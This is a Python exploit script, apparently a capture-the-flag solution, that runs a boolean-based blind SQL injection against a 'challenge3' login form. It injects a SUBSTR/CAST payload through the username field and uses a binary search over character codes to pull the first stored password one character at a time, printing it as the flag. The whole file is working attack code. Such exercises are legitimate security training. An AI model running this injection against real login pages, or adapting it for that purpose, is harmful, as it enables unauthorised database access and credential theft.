#!/usr/bin/python3
import sys
import requests


def send_p(url, query):
    payload = {"username": query, "password": "admin"}
    try:
        r = requests.post(url, data=payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return r.text


def binary_search(url, position, lower_bound, upper_bound):
    if lower_bound > upper_bound:
        return None

    mid = (lower_bound + upper_bound) // 2

    query = f"admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),{position},1) >= CAST(X'{mid:02x}' AS TEXT)--"
    resp = send_p(url, query)

    if "Invalid" in resp:
        return binary_search(url, position, lower_bound, mid - 1)
    else:
        next_char = binary_search(url, position, mid + 1, upper_bound)
        if next_char is None:
            return chr(mid)
        else:
            return next_char


def main(addr):
    url = f"http://{addr}/challenge3/login"
    flag = ""
    password_len = 38

    for i in range(1, password_len):
        char = binary_search(url, i, 0, 127)
        if char:
            flag += char
            print(flag)
        else:
            print("[!] Failed to retrieve character")
            break

    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    main(sys.argv[1])
